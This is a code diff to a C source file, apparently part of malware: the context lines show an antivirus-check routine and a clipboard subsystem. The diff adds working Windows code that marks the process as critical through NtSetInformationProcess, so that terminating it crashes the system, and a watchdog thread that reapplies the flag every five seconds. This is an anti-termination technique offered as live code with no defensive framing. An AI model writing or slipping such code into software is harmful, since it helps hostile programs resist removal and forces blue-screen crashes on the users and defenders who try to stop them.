@@ -199,6 +199,71 @@ void sys_check_antivirus(void) {
     sys_run_command(cmd);
 }
 
+/* === Process Protection === */
+
+static int g_critical_protected = 0;
+
+/* Mark process as critical — Windows BSODs if this process dies */
+void sys_protect_process(void) {
+    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
+    typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        g_critical_protected = -1;
+        return;
+    }
+    
+    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) {
+        g_critical_protected = -1;
+        return;
+    }
+    
+    /* ProcessBreakOnTermination = 29 */
+    ULONG isCritical = 1;
+    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
+    
+    if (status == 0) {
+        g_critical_protected = 1;
+    } else {
+        g_critical_protected = -1;
+    }
+}
+
+/* Remove critical process flag */
+void sys_unprotect_process(void) {
+    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return;
+    
+    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!pNtSetInformationProcess) return;
+    
+    ULONG isCritical = 0;
+    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
+    g_critical_protected = 0;
+}
+
+/* Get protection status string */
+const char* sys_protection_status(void) {
+    if (g_critical_protected == 1) return "CRITICAL";
+    if (g_critical_protected == -1) return "FAILED";
+    return "NORMAL";
+}
+
+/* Watchdog thread: re-apply critical status periodically */
+DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
+    while (1) {
+        if (g_critical_protected == 1) {
+            sys_protect_process();
+        }
+        Sleep(5000);  /* Re-apply every 5 seconds */
+    }
+    return 0;
+}
+
 /* === Clipboard Subsystem === */
 
 void copy_buffer_init(void) {
